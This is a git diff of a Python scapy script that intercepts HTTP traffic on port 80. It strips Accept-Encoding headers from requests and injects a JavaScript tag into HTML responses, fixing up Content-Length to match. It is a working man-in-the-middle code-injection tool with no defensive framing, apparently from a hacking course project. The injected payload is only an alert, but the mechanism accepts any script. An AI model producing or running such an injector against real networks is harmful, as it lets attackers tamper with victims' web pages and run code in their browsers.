@@ -14,22 +14,27 @@ def set_load(packet, load):
 
 # processing packet for further changes, like now we are injecting html and js codes
 def process_packet(packet):
-    print('packetssss')
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        # checking if it is HTTP request by destination port (dport)
-        print(scapy_packet.show())
-        if scapy_packet.haslayer(scapy.TCP):
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()
             if scapy_packet[scapy.TCP].dport == 80:
                 print("[+] Request")
-                # regex code to match the accept encoding
-                string_modified_load = str(scapy_packet[scapy.Raw].load)
-                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", string_modified_load)
-                new_packet = set_load(scapy_packet, modified_load)
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] Responce")
+                injection_code = "<script>alert('you are hacked hahahahahahahahah');</script>"
+                load = load.replace("</body", injection_code + "</body>")
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
                 packet.set_payload(bytes(new_packet))
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response")
-            print(scapy_packet.show())
+        except UnicodeDecodeError:
+            pass
 
     packet.accept()
 
